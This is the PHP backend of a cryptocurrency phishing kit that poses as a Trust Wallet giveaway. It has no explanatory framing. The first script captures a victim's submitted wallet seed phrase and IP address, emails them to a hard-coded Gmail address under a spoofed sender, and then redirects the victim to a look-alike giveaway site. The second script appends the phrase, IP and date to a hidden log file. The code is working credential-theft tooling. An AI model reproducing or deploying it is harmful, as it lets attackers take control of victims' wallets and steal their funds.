<?php


/*========== [ Variables ]==========*/
$ip 		= getenv("REMOTE_ADDR");
$mpc   = $_POST['mpc'];
/*========== [ Variables ]==========*/


$message = "
======= ******************========
SEED TrustWallet   : $mpc
======= ******************========
IP	: http://www.geoiptool.com/?IP=$ip
==========[ THANK'S YOU ]=========";


$to = "emasbintang54@gmail.com"; // Email Here
$subject = "TrustWallet = [$ip]";
$headers = "From: SEED TrustWallet <borusinaga04@stellar.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);


header("Location:https://sites-giveaway-trustwallets.000webhostapp.com/glveaway/colns/waIIet/recelve/free/invalid/?coin=x0&url=coin_id=2");


?>
<?php
$file = "A__0o0o0o__R";
$mpc   = $_POST['mpc'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "**************************************");
fwrite($handle, "\n");
fwrite($handle, "Phrase : ");
fwrite($handle, "$mpc");
fwrite($handle, "\n");
fwrite($handle, "IP     : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "DATE   : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);

?>